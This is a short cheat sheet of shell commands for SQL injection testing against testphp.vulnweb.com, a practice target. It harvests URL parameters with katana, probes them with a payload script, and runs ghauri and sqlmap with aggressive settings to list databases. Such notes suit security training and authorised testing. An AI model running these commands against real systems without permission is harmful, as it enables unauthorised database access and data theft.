### Params find

```
katana -u http://testphp.vulnweb.com -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | sed 's/=.*/=/' | sort -u | tee testphp.vulnweb.com.output.txt
```

### SQLi detect

```
sudo python3 ./lostsec.py -l testphp.vulnweb.com.output.txt -p payloads/xor.txt -t 5
```

### Ghauri

```
ghauri -u "http://testphp.vulnweb.com/artists.php?artist=*" --dbs --batch --confirm --hostname --current-db
```

### Sqlmap

```
sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=*' --batch --dbs --threads=5 --random-agent --risk=3 --level=5 --tamper=space2comment -v 3
```
